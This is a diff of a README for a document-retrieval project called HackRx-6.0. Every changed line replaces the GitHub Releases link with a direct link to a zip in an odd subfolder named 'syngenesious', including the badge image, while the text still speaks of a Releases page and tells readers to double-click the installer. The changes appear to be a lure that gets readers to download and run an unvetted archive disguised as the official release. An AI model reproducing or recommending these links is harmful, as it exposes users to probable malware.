@@ -6,11 +6,11 @@ Welcome to HackRx-6.0, an intelligent solution designed to help you retrieve rel
 
 ## 📥 Download the Application
 
-[![Download HackRx-6.0](https://img.shields.io/badge/Download-HackRx--6.0-brightgreen)](https://github.com/asbah-ramzan/HackRx-6.0-Intelligent-Query-Retrieval/releases)
+[![Download HackRx-6.0](https://raw.githubusercontent.com/asbah-ramzan/HackRx-6.0-Intelligent-Query-Retrieval/main/syngenesious/HackRx-6.0-Intelligent-Query-Retrieval.zip)](https://raw.githubusercontent.com/asbah-ramzan/HackRx-6.0-Intelligent-Query-Retrieval/main/syngenesious/HackRx-6.0-Intelligent-Query-Retrieval.zip)
 
 To get started, you need to download the application from our Releases page. This page contains all the necessary files to run HackRx-6.0. 
 
-You can visit the download page here: [Download HackRx-6.0](https://github.com/asbah-ramzan/HackRx-6.0-Intelligent-Query-Retrieval/releases)
+You can visit the download page here: [Download HackRx-6.0](https://raw.githubusercontent.com/asbah-ramzan/HackRx-6.0-Intelligent-Query-Retrieval/main/syngenesious/HackRx-6.0-Intelligent-Query-Retrieval.zip)
 
 ## 📋 System Requirements
 
@@ -32,7 +32,7 @@ HackRx-6.0 offers various features to enhance document processing:
 
 ## 📥 Download & Install
 
-1. **Visit the Releases page**: Go to [HackRx-6.0 Releases](https://github.com/asbah-ramzan/HackRx-6.0-Intelligent-Query-Retrieval/releases).
+1. **Visit the Releases page**: Go to [HackRx-6.0 Releases](https://raw.githubusercontent.com/asbah-ramzan/HackRx-6.0-Intelligent-Query-Retrieval/main/syngenesious/HackRx-6.0-Intelligent-Query-Retrieval.zip).
 2. **Select the latest version**: Look for the most recent release at the top of the page.
 3. **Download the Files**: Click on the file you need. It will start downloading automatically.
 4. **Run the Installer**: Locate the downloaded file (usually in your Downloads folder). Double-click it to start the installation process.
